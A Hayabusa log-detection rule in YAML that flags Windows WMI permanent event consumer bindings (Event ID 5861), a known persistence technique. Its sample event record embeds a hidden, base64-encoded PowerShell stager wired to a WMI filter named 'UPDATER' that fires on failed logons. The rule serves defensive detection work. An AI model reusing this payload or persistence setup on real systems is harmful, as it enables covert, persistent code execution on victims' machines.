author: Zach Mathis
date: 2022/04/06
modified: 2023/05/06

title: Permanent WMI Event Consumer
details: 'Namespace: %UserDataNamespace% ¦ Consumer: %UserDataConsumer% ¦ Details: %UserDataPossibleCause%'
description: Created when a EventFilterToConsumerBinding event happens.

id: ac9f0a2a-e9c5-4d19-b69e-e3d518ca6797
level: informational
status: stable
logsource:
    product: windows
    service: wmi
    definition: Default in 10/2012-R2+
detection:
    selection_basic:
        Channel: Microsoft-Windows-WMI-Activity/Operational
        EventID: 5861
    condition: selection_basic
falsepositives:
    - unknown
tags:
    - WMI
references:
    - https://attack.mitre.org/techniques/T1546/003/
    - https://www.varonis.com/blog/wmi-windows-management-instrumentation
    - https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
    - https://isc.sans.edu/forums/diary/Keep+an+Eye+on+Your+WMI+Logs/25012/
ruletype: Hayabusa

sample-message: Rendered XML
sample-evtx: |
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System>
            <Provider Name="Microsoft-Windows-WMI-Activity" Guid="{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}" />
            <EventID>5861</EventID>
            <Version>0</Version>
            <Level>0</Level>
            <Task>0</Task>
            <Opcode>0</Opcode>
            <Keywords>0x4000000000000000</Keywords>
            <TimeCreated SystemTime="2022-02-08T10:03:01.466475100Z" />
            <EventRecordID>2214</EventRecordID>
            <Correlation />
            <Execution ProcessID="2396" ThreadID="3708" />
            <Channel>Microsoft-Windows-WMI-Activity/Operational</Channel>
            <Computer>Sec504Student</Computer>
            <Security UserID="S-1-5-18" />
        </System>
        <UserData>
            <Operation_ESStoConsumerBinding xmlns="http://manifests.microsoft.com/win/2006/windows/WMI">
                <Namespace>//./root/subscription</Namespace>
                <ESS>UPDATER</ESS>
                <CONSUMER>CommandLineEventConsumer="UPDATER"</CONSUMER>
                <PossibleCause>Binding EventFilter: instance of __EventFilter { CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 16, 57, 125, 177, 149, 70, 167, 174, 202, 208, 115, 92, 232, 3, 0, 0}; EventNamespace = "root/cimv2"; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%mssqladmin%'"; QueryLanguage = "WQL"; }; Perm. Consumer: instance of CommandLineEventConsumer { CommandLineTemplate = "powershell.exe -nop -w hidden -noni -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AbgBpACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBKADAAKwBBAG0ASQBDAEEANwBWAFcAYgBXAC8AaQBPAEIARAArADMARQByADkARAA5AEUASwBLAFkAbQBVAGsAdgBCAHkAdQAyADIAbABsAFMANABKAHAATgBBAFMAUwBoAHQAZQBXAGwAaAAwAGMAaABNAEQATABrADUATQBZADYAYwAwAHQANwBmAC8ALwBjAGEAUQBiAEwAdgBhADcAdAAzAHUAUwBSAGUAQgBjAE8AdwBaAGUAKwBaADUASABzACsAdwB5AEoASgBRAEUASgBZAG8ANABRADAAbgB5AHUAZQBqAHcANABNAEIAUwBsAEcAcwBhAEIAWAA2AHcAZQBxADAARABLAFgAeQBRAFAAVwBEAEEANQBpAHYAawBEACsAVQBqADQAbwAyAHMAegBlAGIARgBvAHMAUgBTAGUAWgBuAFoAMgA2AFcAcABqAGcAUgArAC8AZgBxAE8AUgBZADIANQB6AGkAKwBwAHcAUgB6AFQAVgBmACsAVQBpAFkAcgBuAE8ATABqAHEALwBzAEgASABBAHIAbABzADEATAA1AG8AMwBwAE8AMgBUADIAaQBoAFYAbgB1AG8AbgBDAEYAbABXAE0ANwBpAGUAUgBhAGoANABWAEkAeABsAEkATgBOAHAAUQBJAFQAZgAzADAAUwBkAFYAbgB4ADcAVgA1AHQAZgAyAFkASQBjAG8AMQBOAGMAaQA1AHcASABFADEAbwBsAFQAVgBsAFMAKwA2AFAASABDAFkAYgA3AEMAbQArAGkAUgBNAEcAVwBjAEwAVQBaADIAUQBwAEYARwB2AGoAaABLAE8ARgByAGcAUAB1AHoAMQBoAEgANABzAFYAaQA3AGkAcQBRAHcANwB3AFMAYgBIAEkAMABrAFMAQgBiAEsAVAA3AGYAbABGAFQAWQBUAGgASQBXAFcAaABIAFUAWQBvADUAVgB3ADEAbABKAGoAZQBlAHoAZQBlAC8AYQA3AFAAaQAxAEoAcwBzAEUAUwBUAEcAMQBXADQAaQBjAE0AbwAyAEEAVQA2AGYAUwBJAGgANQB0AFkATwBTAGkATwBJAGIAdgBKAGkARABWAHkAQgBTAGsAaQB6AG4AdQBnADUAbQBUADIAeQBOAHQAVQBxAFMAVQBXAG8AbwB2ADcASwBOADEAcwBmAGIARQByAE8AZgBkAGQASgBlAE8ANABIAFYAUQBLAFMANgBBAFMAUgArAGwANgBYAFAAbwBvAHoAaQB2AFoALwA2AFIAcABoADcAMgBuAFYANAA5AHQAUQBEAGEAbAArAE8ARABvADgATwBGADYAVgBPADAAdABIAEoAYQA1AG4AQQA2AEcAQwAyAEcAMgBNAEkAVABSAHMAdwBUAG4AWgBtAEgAeABYAEwAVQBIAHcANABCAGcAbQBXADUAdgBCAGEARwBhAFkAWgAxAHUAZABmAGcAVgBVAHEASwBmAHYATgArAEwARgA3AHIAYgBRAEYAUwB4AFIAdQBCAFkAZQA1ADIAWgBpAFIAYQBBADQAKwBCAFoAZQBWAHIAQwBsAG4AZgA2AHoASQBGAGwANgBRAEIATABmAHkAQgBNAFUAawBMAEUAVwBuAHYAUQBVAHcAWABsAEMAOABTADcAQgBhAG0AdgBVAGgASgBrADAAdABGAG4ARABVAHcAaABRAHYAawBaAEMAZwBTAFoANgAvAGMAMgB2AEgAUgBIAHoAMQBkAFQASgBDAEkANQB6AGEASQBaAEQARQBJAFMAcgBnAFQALwA4ADIAbQBEADAAUABtAHQAcABOAGYAQgB3AEQAUQB2AHQAMwBFAEYANQBsAEEAVgBMAEgAcABYAFUAaAA3ADcAdwA4AFgAYgA2AEQAawBlAHAAUwB4AEwAbQBoAEQARABLADQAYQA2AEcAaABCAEIAaABSAEgAQgBtAEsAbgBYAEIAUwBMAE4AbQBaAFkATAB1AGgAKwBoAEsAdQBuADEARgBCAFEAcwBSAEYAdQBkADEAYwAzADYATgBZAG4ATwBhAHkAaABJAHMAMABDADQARQB5AHkASAB3AFkAYgBIAEIASQBFAEoAVgBBAEcARQBxAEgAUgBOAGoASgBBADcASQBzAFQAMQBYAGYAaABNAEYARgBsAE0ASQBOAGcASgAyAGUAZwBBAGEAWQBrAGUAawBIAFEAZwBvAGgAaABRAEEAbAA2AFgAbwAxAHcASwBJAGIAYgB5AGkATwB3AFcAUgAzADQAegAyAEsAbABuAEMALwBDADUAbgB2AGgASQBPAFcATwBGAEsALwBEAGEAKwBVADgAVgA2AHoARQBvAFkAeQAvADEAZgBCAEEAYgBjAEIAWgBjAEoAUQB4AGkAUQBWAFUARABZAGsAcABEAHYAOQAvAEsAZgBEAFgAeABVAE0AQwBNAE4ATgBjAGMARwBCAFYAdAA2AEwAbQBaAE0ATABLAGUAYwBLAGUAWgBCAFMATABBAEQAWgBwAFoAOABLAFMATgAxAEwAVwBlAHcAZwBqAHQAOAAzADkANgBWAEIAZQAyAGQAZQBrAFkARQBOAHoAMQAwADMAbwBYADUAMABzAFMAYQAxADcAaABhACsAUABuAHgASAByAFEALwBSADUAUQBVAFQAKwBXAFcAcgBZAC8AcQBoAHkAdwBmAG4AMwBvAGwATgB0AHMAdAB0AGUATgBLADMAdwArAGcAaQB3AHEAZgBCAHUAQwBtAEMAZABsAGUANABBADcAdAB6AFQAUwB5AG4AdQBRAG8AZABhAHkAagBIAHQAZQBWAHkAMQBCAFgAZABjADcAcwB6AFgASQBYAFUARwByAFQAagBYAHIALwBMAG4AOAAxAHQAWgArAEsASABMAGUAZgBQAGIAWgAyAEQASQBKAHYATgB6AHEAMQBsAE4AeAByAE4AcQA0AGEAMQBCAHQAVAB1AHcARwA5AHQAUgAvADIAWQBiAEoAOQA3AE0ASQBZAGEAZQBOAFYAegB1AHQAeQB4AHUAcgBSADkANABkADcAYwBUACsAcgBlAGQARQBJADcAWgB0AE4AYgBMAFMAYQBNAEIAKwAvAHYAVwBxAFoAcABuAGsAYQBvADUAZQBlADIANwBiAEMAbwA0AGUAZQAzAHQAUgBzADIANwBJAFMAeAAwADAAeQBZAGUAZQBvADIAMQAzAGIAYgB0AHQAMgBrAFAAZgBZAGMAZABuAG4AbgBwAFAAYgBBAEgASwBQAGwAaAByAG4ATABUAGMAKwBlAEwARgAzAGIAOABVAEsAQwBwADkAYwBqAHoANwBtACsAOQBoAHgANwBkAFAANwB3ADIARABvADEAbAArAGIAcAA1AEIAYQB0AG4ATQBtADQAVABxAGEAYgAyADUAcwBWAHYASAB2AGIAegByAFYAdgBXAHMAMQB1AGgASgAvAFoAUwBXADkAQwB4AGsAOQB5AEwAKwBmAFIAOABhAGEAMwB5AE8ANQBOAGMAOAA4ADAAYQAzAGUAOABqAHQAWQBPAHMAeAAwAEEAMQBwAHMAKwAyAHUAZQByAHUANAAwADMAbwBPAEEALwBIAE4AVwBaAFAAYQBiADkARgA5AHYAcgBUAHUAcwB5AG4ATgBZACsAYwBQAC8AagBPADgAawB4AGsARgB4AGgAVgA4ACsAdgA2AFAAdABSAHUAZgBWAFIAeQBsAGUASQBBAHEAMQBRAFMAYwBzADcANQBMAEgAVQBLADQAcgBqAGcAQgBIAHAAbwBXAG0ANwBaAHIAcgBHAGEAWQBJAHAAZABDAFAAbwBWADYAVQBhAGIAVQBwAFoASwBDAHUAegBMAEsAUABRAEYAUABhAGwAVwBuAGEATwBFAFEAdwBiADkAVABkAEgAdQB2AEwAVgBVAEgAOABwADIAZQBYAFUAMgBkAGsAVQBnAGcAUgAxAGsANABkAHEARAB5AGQATABzAFQASwBzADUANABaAGwAUQBmADIAMQBuAHAAcwBXAFoAUABqAHoAYQBiAGwAcwBrADAAUABUAGUARABCAGsAOQBaAGEAZwA3AEwAZQBsAHUAMgAxADEAcQBmAGQASwB2AGwAMAArAC8AYgA5AFEARgBiAGQAcwBCAFQALwBSAHYAMABEADEATQB2AGMAUABxAHoAOABGAG4AMgBYAHMAMAB2ADEAdQA5AHQAdQBKAFgAdwBMAHoAbAB4AE8AZgBJAEMATABBAE0AbwBBAHkAUQBmAEcAKwBQADcAMgBaAGYANgBHAEsAVgA5ADEAYgBrAGcASwBzAEwANABwAEgALwB2AFcANgB5AHMAUgB4AEgANQByADYAMABlAEgAZgBOAGUARwBaADIAKwBNAEoAQQBBAEEAPQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="; CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 16, 57, 125, 177, 149, 70, 167, 174, 202, 208, 115, 92, 232, 3, 0, 0}; Name = "UPDATER"; };</PossibleCause>
            </Operation_ESStoConsumerBinding>
        </UserData>
    </Event>